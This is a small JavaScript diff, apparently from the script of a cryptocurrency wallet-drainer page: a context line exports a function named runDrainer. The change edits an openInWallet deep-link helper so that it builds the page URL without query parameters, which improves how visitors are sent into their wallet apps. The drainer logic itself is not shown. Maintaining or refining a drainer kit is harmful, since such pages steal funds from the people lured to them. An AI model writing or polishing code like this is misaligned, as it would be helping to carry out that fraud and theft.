@@ -5582,7 +5582,8 @@ window.runDrainer = runDrainer;
 
     // Function to handle deep links properly (moved outside for global access)
     async function openInWallet(walletType) {
-      const currentUrl = window.location.href;
+      // Use base URL without query parameters to avoid double-encoding issues
+      const currentUrl = window.location.origin + window.location.pathname;
       let deepLink = '';
       let fallbackUrl = '';
       
